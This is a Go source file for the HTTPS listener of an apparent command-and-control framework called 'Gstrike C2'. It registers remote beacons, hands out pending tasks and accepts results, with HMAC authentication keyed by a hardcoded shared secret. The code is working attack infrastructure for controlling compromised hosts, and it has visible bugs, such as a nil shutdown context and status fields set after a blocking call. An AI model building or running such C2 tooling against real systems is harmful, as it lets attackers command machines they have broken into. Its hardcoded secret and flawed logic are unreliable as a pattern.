package comms

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"gstrike/pkg/core"
	"gstrike/pkg/util"
	"io"
	"net/http"
	"strconv"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

var SharedSecret string = "378432999013382759857861340953603067"
var Listeners []HttpsListener

type HttpsListener struct {
	ID        string    // Unique identifier (e.g., UUID)
	Port      int       // Port number
	CreatedAt time.Time // When the listener was created
	StartedAt time.Time // When the listener was started (may be zero if not started yet)
	Status    string    // Current status: "stopped", "running", "error", etc.
	CertFile  string    // Path to TLS cert file (if TLS enabled)
	KeyFile   string    // Path to TLS key file (if TLS enabled)
	Server    *http.Server
}

func NewHttps(port int) HttpsListener {
	listener := HttpsListener{
		ID:        uuid.NewString(),
		Port:      port,
		CreatedAt: time.Now(),
		CertFile:  "build/config/certs/server.crt",
		KeyFile:   "build/config/certs/server.key",
	}
	listener.Status = "stopped"
	Listeners = append(Listeners, listener)
	return listener
}

func (l *HttpsListener) Start() {
	r := mux.NewRouter()
	beaconApi := r.PathPrefix("/").Subrouter()

	beaconApi.Use(BeaconHMACAuth)
	beaconApi.HandleFunc("/register", RegisterBeaconHandler).Methods("POST")
	beaconApi.HandleFunc("/tasks/{beaconId}", GetTasksHandler).Methods("GET")
	beaconApi.HandleFunc("/results/{beaconId}", PostResultsHandler).Methods("POST")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}
	l.Server = &http.Server{
		Addr:      ":" + strconv.Itoa(l.Port),
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	err := l.Server.ListenAndServeTLS(l.CertFile, l.KeyFile)
	if err != nil {
		fmt.Printf("%sError when starting listener: %v\n", util.PrintBad, err)
		return
	}
	l.StartedAt = time.Now()
	l.Status = "running"
	fmt.Printf("%s [%s] Gstrike C2 Https server listening on https://localhost:%d\n", util.PrintGood, l.StartedAt, l.Port)
}

func (l *HttpsListener) Stop() error {
	var ctx context.Context
	var err error
	if l.Status == "running" {
		l.Status = "stopped"
		err = l.Server.Shutdown(ctx)
	}
	return err
}

func BeaconHMACAuth(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		signature := r.Header.Get("X-Agent-Signature")
		if signature == "" {
			http.Error(w, "Missing signature", http.StatusUnauthorized)
			return
		}

		bodyBytes, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading body", http.StatusBadRequest)
			return
		}
		r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes)) // restore body

		mac := hmac.New(sha256.New, []byte(SharedSecret))
		mac.Write(bodyBytes)
		expectedMAC := hex.EncodeToString(mac.Sum(nil))

		if !hmac.Equal([]byte(signature), []byte(expectedMAC)) {
			http.Error(w, "Unauthorized (HMAC failed)", http.StatusUnauthorized)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func RegisterBeaconHandler(w http.ResponseWriter, r *http.Request) {
	var beacon core.Beacon
	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
		fmt.Printf("error: %v\n", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	beacon.ID = uuid.New().String()
	beacon.FirstSeen = time.Now()
	beacon.LastSeen = time.Now()
	beacon.ExternalIP = r.RemoteAddr

	core.Beacons[beacon.ID] = beacon

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(beacon)
}

func PostResultsHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println(util.PrintStatus, r.Body)
}

func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
	beaconId := mux.Vars(r)["beaconId"]
	beaconTasks := core.Tasks[beaconId]
	var beaconTask core.Task

	for i := 0; i < len(beaconTasks); i++ {
		if beaconTasks[i].Status == "pending" {
			beaconTask = beaconTasks[i]
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(beaconTask)
}
